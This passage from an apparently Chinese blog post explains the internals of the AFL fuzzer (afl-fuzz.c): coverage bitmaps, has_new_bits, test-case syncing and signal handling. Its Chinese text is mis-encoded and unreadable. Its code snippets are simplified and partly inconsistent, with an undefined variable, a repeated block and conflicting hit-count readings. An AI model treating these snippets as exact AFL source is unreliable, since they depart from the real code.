CASE_PREFIX <span class="string">&quot;%06u&quot;</span>, &amp;syncing_case) != <span class="number">1</span> || </span><br><span class="line">        syncing_case &lt; min_accept) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åªå¤„ç†æ–°çš„æµ‹è¯•ç”¨ä¾‹</span></span><br><span class="line">    <span class="keyword">if</span> (syncing_case &gt;= next_min_accept)</span><br><span class="line">        next_min_accept = syncing_case + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    path = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/%s&quot;</span>, qd_path, qd_ent-&gt;d_name);</span><br><span class="line">    fd = <span class="built_in">open</span>(path, O_RDONLY);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">ck_free</span>(path);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¯»å–æµ‹è¯•ç”¨ä¾‹å†…å®¹</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fstat</span>(fd, &amp;st)) <span class="built_in">PFATAL</span>(<span class="string">&quot;fstat() failed&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (st.st_size &amp;&amp; st.st_size &lt;= MAX_FILE) &#123;</span><br><span class="line">        u8* mem = <span class="built_in">mmap</span>(<span class="number">0</span>, st.st_size, PROT_READ, MAP_PRIVATE, fd, <span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æ‰§è¡Œæµ‹è¯•ç”¨ä¾‹</span></span><br><span class="line">        <span class="built_in">write_to_testcase</span>(mem, st.st_size);</span><br><span class="line">        fault = <span class="built_in">run_target</span>(argv, exec_tmout);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æ£€æŸ¥æ˜¯å¦æœ‰è¶£å¹¶ä¿å­˜</span></span><br><span class="line">        syncing_party = sd_ent-&gt;d_name;</span><br><span class="line">        queued_imported += <span class="built_in">save_if_interesting</span>(argv, mem, st.st_size, fault);</span><br><span class="line">        syncing_party = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">munmap</span>(mem, st.st_size);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ›´æ–°åŒæ­¥çŠ¶æ€</span></span><br><span class="line"><span class="built_in">ck_write</span>(id_fd, &amp;next_min_accept, <span class="built_in">sizeof</span>(u32), qd_synced_path);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œä¿ç•™ç”¨ä¾‹æ¥è‡ªäº<code>save_if_interesting</code>å‡½æ•°ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> u8 <span class="title">save_if_interesting</span><span class="params">(<span class="type">char</span>** argv, <span class="type">void</span>* mem, u32 len, u8 fault)</span> </span>&#123;</span><br><span class="line">    u8 hnb;</span><br><span class="line">    u8 keeping = <span class="number">0</span>, res;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fault == crash_mode) &#123;</span><br><span class="line">        <span class="comment">// å…³é”®ï¼šæ£€æŸ¥æ˜¯å¦æœ‰æ–°çš„è¦†ç›–ç‡ä½</span></span><br><span class="line">        <span class="keyword">if</span> (!(hnb = <span class="built_in">has_new_bits</span>(virgin_bits))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (crash_mode) total_crashes++;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// æ²¡æœ‰æ–°è¦†ç›–ç‡ï¼Œä¸ä¿å­˜</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æœ‰æ–°è¦†ç›–ç‡ï¼Œä¿å­˜åˆ°é˜Ÿåˆ—</span></span><br><span class="line">        <span class="built_in">add_to_queue</span>(fn, len, <span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (hnb == <span class="number">2</span>) &#123;</span><br><span class="line">            queue_top-&gt;has_new_cov = <span class="number">1</span>;  <span class="comment">// æ ‡è®°ä¸ºæœ‰æ–°è¦†ç›–ç‡</span></span><br><span class="line">            queued_with_cov++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        keeping = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> keeping;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> u8 <span class="title">has_new_bits</span><span class="params">(u8* virgin_map)</span> </span>&#123;</span><br><span class="line">    u64* current = (u64*)trace_bits;    <span class="comment">// å½“å‰æ‰§è¡Œçš„è¦†ç›–ç‡</span></span><br><span class="line">    u64* virgin  = (u64*)virgin_map;    <span class="comment">// å…¨å±€virginä½å›¾</span></span><br><span class="line">    u32  i = (MAP_SIZE &gt;&gt; <span class="number">3</span>);</span><br><span class="line">    u8   ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i--) &#123;</span><br><span class="line">        <span class="comment">// æ£€æŸ¥å½“å‰æ‰§è¡Œæ˜¯å¦è§¦åŠäº†virginä½å›¾ä¸­çš„æ–°ä½</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">unlikely</span>(*current) &amp;&amp; <span class="built_in">unlikely</span>(*current &amp; *virgin)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">likely</span>(ret &lt; <span class="number">2</span>)) &#123;</span><br><span class="line">                u8* cur = (u8*)current;</span><br><span class="line">                u8* vir = (u8*)virgin;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// æ£€æŸ¥æ˜¯å¦æœ‰å®Œå…¨æ–°çš„è·¯å¾„ (virginä½ä¸º0xff)</span></span><br><span class="line">                <span class="keyword">if</span> ((cur[<span class="number">0</span>] &amp;&amp; vir[<span class="number">0</span>] == <span class="number">0xff</span>) || (cur[<span class="number">1</span>] &amp;&amp; vir[<span class="number">1</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">                    (cur[<span class="number">2</span>] &amp;&amp; vir[<span class="number">2</span>] == <span class="number">0xff</span>) || (cur[<span class="number">3</span>] &amp;&amp; vir[<span class="number">3</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">                    (cur[<span class="number">4</span>] &amp;&amp; vir[<span class="number">4</span>] == <span class="number">0xff</span>) || (cur[<span class="number">5</span>] &amp;&amp; vir[<span class="number">5</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">                    (cur[<span class="number">6</span>] &amp;&amp; vir[<span class="number">6</span>] == <span class="number">0xff</span>) || (cur[<span class="number">7</span>] &amp;&amp; vir[<span class="number">7</span>] == <span class="number">0xff</span>)) </span><br><span class="line">                    ret = <span class="number">2</span>;  <span class="comment">// å‘ç°æ–°è·¯å¾„</span></span><br><span class="line">                <span class="keyword">else</span> </span><br><span class="line">                    ret = <span class="number">1</span>;  <span class="comment">// åªæ˜¯å‘½ä¸­æ¬¡æ•°å˜åŒ–</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ›´æ–°virginä½å›¾</span></span><br><span class="line">            *virgin &amp;= ~*current;</span><br><span class="line">        &#125;</span><br><span class="line">        current++;</span><br><span class="line">        virgin++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ret=0</code>çš„è¯ä»£è¡¨æ²¡æœ‰æ–°è¦†ç›–ç‡ï¼Œ<code>ret=1</code>ä»£è¡¨å‘ç°å·²çŸ¥è·¯å¾„çš„æ–°çš„å‘½ä¸­æ¬¡æ•°ï¼Œ<code>ret=2</code>ä»£è¡¨å‘ç°å…¨æ–°çš„æ‰§è¡Œè·¯å¾„</p><h4 id="bitmap"><a href="#bitmap" class="headerlink" title="bitmap"></a>bitmap</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_SIZE_POW2       16          <span class="comment">// 2^16 = 65536</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_SIZE            (1 &lt;&lt; MAP_SIZE_POW2)  <span class="comment">// 65536å­—èŠ‚</span></span></span><br><span class="line"></span><br><span class="line">EXP_ST u8  virgin_bits[MAP_SIZE],       <span class="comment">// æœªè§¦åŠçš„è¦†ç›–ç‡åŒºåŸŸ</span></span><br><span class="line">           virgin_tmout[MAP_SIZE],      <span class="comment">// è¶…æ—¶æƒ…å†µä¸‹çš„virginä½å›¾</span></span><br><span class="line">           virgin_crash[MAP_SIZE];      <span class="comment">// å´©æºƒæƒ…å†µä¸‹çš„virginä½å›¾</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">setup_shm</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å…³é”®ï¼šå¦‚æœæ²¡æœ‰åŠ è½½bitmap (-Bé€‰é¡¹)ï¼Œåˆ™åˆå§‹åŒ–ä¸ºå…¨1</span></span><br><span class="line">    <span class="keyword">if</span> (!in_bitmap) <span class="built_in">memset</span>(virgin_bits, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(virgin_tmout, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(virgin_crash, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ... å…±äº«å†…å­˜è®¾ç½®</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Virginä½å›¾çš„å€¼å«ä¹‰ï¼š</span></span><br><span class="line"><span class="comment">// 0xFF (11111111) - å®Œå…¨æœªè§¦åŠçš„è·¯å¾„</span></span><br><span class="line"><span class="comment">// 0xFE (11111110) - è§¦åŠè¿‡1æ¬¡</span></span><br><span class="line"><span class="comment">// 0xFC (11111100) - è§¦åŠè¿‡1-2æ¬¡  </span></span><br><span class="line"><span class="comment">// 0xF8 (11111000) - è§¦åŠè¿‡1-4æ¬¡</span></span><br><span class="line"><span class="comment">// 0xF0 (11110000) - è§¦åŠè¿‡1-8æ¬¡</span></span><br><span class="line"><span class="comment">// 0xE0 (11100000) - è§¦åŠè¿‡1-16æ¬¡</span></span><br><span class="line"><span class="comment">// 0xC0 (11000000) - è§¦åŠè¿‡1-32æ¬¡</span></span><br><span class="line"><span class="comment">// 0x80 (10000000) - è§¦åŠè¿‡1-128æ¬¡</span></span><br><span class="line"><span class="comment">// 0x00 (00000000) - è§¦åŠè¿‡128+æ¬¡</span></span><br></pre></td></tr></table></figure><h4 id="Bitmapæ–‡ä»¶çš„åå…­è¿›åˆ¶ç¤ºä¾‹"><a href="#Bitmapæ–‡ä»¶çš„åå…­è¿›åˆ¶ç¤ºä¾‹" class="headerlink" title="Bitmapæ–‡ä»¶çš„åå…­è¿›åˆ¶ç¤ºä¾‹"></a>Bitmapæ–‡ä»¶çš„åå…­è¿›åˆ¶ç¤ºä¾‹</h4><p>bash</p><p>Apply to afl-fuzz.c</p><p>Run</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">\# æŸ¥çœ‹bitmapæ–‡ä»¶å†…å®¹ï¼ˆå‰32å­—èŠ‚ï¼‰</span><br><span class="line"></span><br><span class="line">hexdump -C output_dir/fuzz_bitmap | head -5</span><br><span class="line"></span><br><span class="line">00000000 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff |................|</span><br><span class="line"></span><br><span class="line">00000010 ff ff ff fe ff ff fc ff ff f8 ff ff f0 ff ff e0 |................|</span><br><span class="line"></span><br><span class="line">00000020 ff ff c0 ff ff 80 ff ff 00 ff ff ff ff ff ff ff |................|</span><br><span class="line"></span><br><span class="line">00000030 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff |................|</span><br></pre></td></tr></table></figure><p>è§£è¯»ï¼š</p><ul><li><p><code>0x0000-0x000F</code>: å…¨éƒ¨ä¸º0xFFï¼Œè¡¨ç¤ºè¿™äº›è·¯å¾„å®Œå…¨æœªè¢«è§¦åŠ</p></li><li><p><code>0x0010: 0xFE</code>ï¼Œè¡¨ç¤ºè¿™ä¸ªè·¯å¾„è¢«è§¦åŠè¿‡1æ¬¡</p></li><li><p><code>0x0012: 0xFC</code>ï¼Œè¡¨ç¤ºè¿™ä¸ªè·¯å¾„è¢«è§¦åŠè¿‡2-3æ¬¡</p></li><li><p><code>0x0014: 0xF8</code>ï¼Œè¡¨ç¤ºè¿™ä¸ªè·¯å¾„è¢«è§¦åŠè¿‡4-7æ¬¡</p></li><li><p>ä»¥æ­¤ç±»æ¨â€¦</p></li></ul><p>æ¥ä¸‹æ¥å°±æ˜¯ä¸€äº›å‚æ•°çš„éªŒè¯å’Œç¯å¢ƒçš„æ£€æŸ¥</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. å¿…éœ€å‚æ•°æ£€æŸ¥</span></span><br><span class="line"><span class="keyword">if</span> (optind == argc || !in_dir || !out_dir) <span class="built_in">usage</span>(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. ä¿¡å·å¤„ç†å™¨è®¾ç½®</span></span><br><span class="line"><span class="built_in">setup_signal_handlers</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. ASANé€‰é¡¹æ£€æŸ¥</span></span><br><span class="line"><span class="built_in">check_asan_opts</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. åŒæ­¥è®¾ç½®</span></span><br><span class="line"><span class="keyword">if</span> (sync_id) <span class="built_in">fix_up_sync</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. ç›®å½•å†²çªæ£€æŸ¥</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, out_dir))</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Input and output directories can&#x27;t be the same&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dumb_mode) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (crash_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;-C and -n are mutually exclusive&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (qemu_mode)  <span class="built_in">FATAL</span>(<span class="string">&quot;-Q and -n are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ—¶dubmæ¨¡å¼ä¸crashå’Œqemuæ¨¡å¼ä¸å…¼å®¹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_FORKSRV&quot;</span>))    no_forkserver    = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_CPU_RED&quot;</span>))    no_cpu_meter_red = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_ARITH&quot;</span>))      no_arith         = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_SHUFFLE_QUEUE&quot;</span>)) shuffle_queue    = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_FAST_CAL&quot;</span>))      fast_cal         = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>é‡è¦ç¯å¢ƒå˜é‡ï¼š</p><table><thead><tr><th align="left">å˜é‡</th><th align="left">åŠŸèƒ½</th><th align="left">å½±å“</th></tr></thead><tbody><tr><td align="left">AFL_NO_FORKSRV</td><td align="left">ç¦ç”¨fork server</td><td align="left">æ€§èƒ½ä¸‹é™</td></tr><tr><td align="left">AFL_NO_CPU_RED</td><td align="left">ç¦ç”¨CPUçº¢è‰²è­¦å‘Š</td><td align="left">ç•Œé¢ä¼˜åŒ–</td></tr><tr><td align="left">AFL_NO_ARITH</td><td align="left">ç¦ç”¨ç®—æœ¯å˜å¼‚</td><td align="left">ç­–ç•¥ç®€åŒ–</td></tr><tr><td align="left">AFL_SHUFFLE_QUEUE</td><td align="left">éšæœºåŒ–é˜Ÿåˆ—é¡ºåº</td><td align="left">æ¢ç´¢ç­–ç•¥</td></tr><tr><td align="left">AFL_FAST_CAL</td><td align="left">å¿«é€Ÿæ ¡å‡†</td><td align="left">å¯åŠ¨ä¼˜åŒ–</td></tr></tbody></table><h3 id="ç³»ç»Ÿç¯å¢ƒå‡†å¤‡å’Œåˆå§‹åŒ–"><a href="#ç³»ç»Ÿç¯å¢ƒå‡†å¤‡å’Œåˆå§‹åŒ–" class="headerlink" title="ç³»ç»Ÿç¯å¢ƒå‡†å¤‡å’Œåˆå§‹åŒ–"></a>ç³»ç»Ÿç¯å¢ƒå‡†å¤‡å’Œåˆå§‹åŒ–</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. å¿…éœ€å‚æ•°æ£€æŸ¥</span></span><br><span class="line"><span class="keyword">if</span> (optind == argc || !in_dir || !out_dir) <span class="built_in">usage</span>(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. ä¿¡å·å¤„ç†å™¨è®¾ç½®</span></span><br><span class="line"><span class="built_in">setup_signal_handlers</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. ASANé€‰é¡¹æ£€æŸ¥</span></span><br><span class="line"><span class="built_in">check_asan_opts</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. åŒæ­¥è®¾ç½®</span></span><br><span class="line"><span class="keyword">if</span> (sync_id) <span class="built_in">fix_up_sync</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. ç›®å½•å†²çªæ£€æŸ¥</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, out_dir))</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Input and output directories can&#x27;t be the same&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">save_cmdline</span>(argc, argv);          <span class="comment">// ä¿å­˜å‘½ä»¤è¡Œ</span></span><br><span class="line"><span class="built_in">fix_up_banner</span>(argv[optind]);       <span class="comment">// è®¾ç½®æ¨ªå¹…</span></span><br><span class="line"><span class="built_in">check_if_tty</span>();                    <span class="comment">// æ£€æŸ¥ç»ˆç«¯</span></span><br><span class="line"><span class="built_in">get_core_count</span>();                  <span class="comment">// è·å–CPUæ ¸å¿ƒæ•°</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_AFFINITY</span></span><br><span class="line"><span class="built_in">bind_to_free_cpu</span>();                <span class="comment">// ç»‘å®šåˆ°ç©ºé—²CPU</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">check_crash_handling</span>();            <span class="comment">// æ£€æŸ¥å´©æºƒå¤„ç†</span></span><br><span class="line"><span class="built_in">check_cpu_governor</span>();              <span class="comment">// æ£€æŸ¥CPUè°ƒé€Ÿå™¨</span></span><br><span class="line"><span class="built_in">setup_post</span>();                      <span class="comment">// è®¾ç½®åå¤„ç†</span></span><br><span class="line"><span class="built_in">setup_shm</span>();                       <span class="comment">// è®¾ç½®å…±äº«å†…å­˜</span></span><br><span class="line"><span class="built_in">init_count_class16</span>();              <span class="comment">// åˆå§‹åŒ–è®¡æ•°åˆ†ç±»</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">setup_dirs_fds</span>();                  <span class="comment">// è®¾ç½®ç›®å½•å’Œæ–‡ä»¶æè¿°ç¬¦</span></span><br><span class="line"><span class="built_in">read_testcases</span>();                  <span class="comment">// è¯»å–æµ‹è¯•ç”¨ä¾‹</span></span><br><span class="line"><span class="built_in">load_auto</span>();                       <span class="comment">// åŠ è½½è‡ªåŠ¨ä»¤ç‰Œ</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">pivot_inputs</span>();                    <span class="comment">// è½¬æ¢è¾“å…¥æ ¼å¼</span></span><br><span class="line"><span class="keyword">if</span> (extras_dir) <span class="built_in">load_extras</span>(extras_dir);  <span class="comment">// åŠ è½½å­—å…¸</span></span><br><span class="line"><span class="keyword">if</span> (!timeout_given) <span class="built_in">find_timeout</span>();       <span class="comment">// è‡ªåŠ¨æ£€æµ‹è¶…æ—¶</span></span><br></pre></td></tr></table></figure><h4 id="setup-signal-handlers"><a href="#setup-signal-handlers" class="headerlink" title="setup_signal_handlers();"></a>setup_signal_handlers();</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">setup_signal_handlers</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">sigaction</span> sa;</span><br><span class="line">  sa.sa_handler   = <span class="literal">NULL</span>;</span><br><span class="line">  sa.sa_flags     = SA_RESTART;</span><br><span class="line">  sa.sa_sigaction = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">sigemptyset</span>(&amp;sa.sa_mask);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* å„ç§åœæ­¢ä¿¡å·çš„å¤„ç† */</span></span><br><span class="line">  sa.sa_handler = handle_stop_sig;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGHUP, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGINT, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGTERM, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* æ‰§è¡Œè¶…æ—¶é€šçŸ¥ */</span></span><br><span class="line">  sa.sa_handler = handle_timeout;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGALRM, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* çª—å£å¤§å°æ”¹å˜ */</span></span><br><span class="line">  sa.sa_handler = handle_resize;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGWINCH, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* SIGUSR1: è·³è¿‡å½“å‰æ¡ç›® */</span></span><br><span class="line">  sa.sa_handler = handle_skipreq;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGUSR1, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* æˆ‘ä»¬ä¸å…³å¿ƒçš„ä¿¡å· */</span></span><br><span class="line">  sa.sa_handler = SIG_IGN;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGTSTP, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGPIPE, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="handle-stop-sig"><a href="#handle-stop-sig" class="headerlink" title="handle_stop_sig"></a>handle_stop_sig</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">handle_stop_sig</span><span class="params">(<span class="type">int</span> sig)</span> </span>&#123;</span><br><span class="line">  stop_soon = <span class="number">1</span>; </span><br><span class="line">  <span class="keyword">if</span> (child_pid &gt; <span class="number">0</span>) <span class="built_in">kill</span>(child_pid, SIGKILL);</span><br><span class="line">  <span class="keyword">if</span> (forksrv_pid &gt; <span class="number">0</span>) <span class="built_in">kill</span>(forksrv_pid, SIGKILL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>è®¾ç½®stop_soonæ ‡å¿—ä¸º1ï¼Œè¡¨ç¤ºAFLåº”è¯¥å¼€å§‹ä¼˜é›…é€€å‡º</p></li><li><p>ç»ˆæ­¢æ‰€æœ‰å­è¿›ç¨‹å’ŒforkæœåŠ¡å™¨è¿›ç¨‹</p></li><li><p>å“åº”SIGHUPï¼ˆç»ˆç«¯æ–­å¼€ï¼‰ã€SIGINTï¼ˆCtrl+Cï¼‰å’ŒSIGTERMï¼ˆç»ˆæ­¢è¯·æ±‚ï¼‰ä¿¡å·</p></li></ul><h5 id="handle-timeout"><a href="#handle-timeout" class="headerlink" title="handle_timeout"></a>handle_timeout</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 